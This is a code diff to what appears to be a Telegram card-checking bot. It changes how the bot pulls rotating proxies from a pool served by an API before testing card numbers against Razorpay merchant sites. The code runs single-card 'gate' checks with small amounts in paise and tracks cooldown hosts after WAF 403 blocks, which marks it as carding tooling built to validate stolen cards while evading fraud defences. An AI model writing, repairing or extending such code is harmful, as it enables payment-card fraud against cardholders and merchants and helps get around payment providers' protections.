@@ -36,6 +36,20 @@ def _load_rz_sites():
         return []
 
 
+async def _get_rz_pool_proxies():
+    """Razorpay's own proxy pool from the :9000 API (NOT the /proxy DB)."""
+    import aiohttp
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f"{RZ_API}/pool-list", timeout=10) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    return data.get("proxies", [])
+    except Exception as e:
+        logging.error(f"[rz] pool-list error: {e}")
+    return []
+
+
 def _rz_api_check(cc, proxy, site, amount_paise):
     """Single-card check against the Razorpay API. Returns {status, response}."""
     q = urllib.parse.urlencode({"cc": cc, "site": site, "proxy": proxy, "amount": amount_paise, "region": "IN"})
@@ -405,15 +419,11 @@ async def process_rz_check(message, proc_msg, user, user_id, formatted_cc, cc, p
         # ═══════════════════════════════════════════════════════
         # NON-INDIA CARD - Proceed with actual gate check
         # ═══════════════════════════════════════════════════════
-        # Get a proxy for this check
-        try:
-            from mass_gates.msh import get_user_proxies as _get_user_proxies
-            _proxies = await _get_user_proxies(user_id)
-            _proxy = random.choice(_proxies) if _proxies else ""
-        except Exception:
-            _proxy = ""
+        # Get a proxy from the Razorpay API's own pool (excluded from /proxy DB)
+        _proxies = await _get_rz_pool_proxies()
+        _proxy = random.choice(_proxies) if _proxies else ""
         if not _proxy:
-            api_result = {"status": "error", "response": "No proxies loaded. Use /proxy."}
+            api_result = {"status": "error", "response": "No proxies in the Razorpay pool."}
         else:
             api_result = await asyncio.to_thread(_rz_api_check, formatted_cc, _proxy, site, amount_paise)
         status_raw = api_result.get("status", "").lower()
@@ -489,13 +499,8 @@ async def process_rz_check(message, proc_msg, user, user_id, formatted_cc, cc, p
 async def rzp_command(message: types.Message):
     user_id = message.from_user.id
 
-    # 1) the user's proxies live in the BOT DB (not the API pool) — read them
-    proxies = []
-    try:
-        from mass_gates.msh import get_user_proxies
-        proxies = await get_user_proxies(user_id)
-    except Exception:
-        proxies = []
+    # 1) Razorpay proxies live in the API's own pool (not the /proxy DB)
+    proxies = await _get_rz_pool_proxies()
 
     # 2) cooldown state lives in the API (recorded on WAF 403)
     cd_hosts = {}
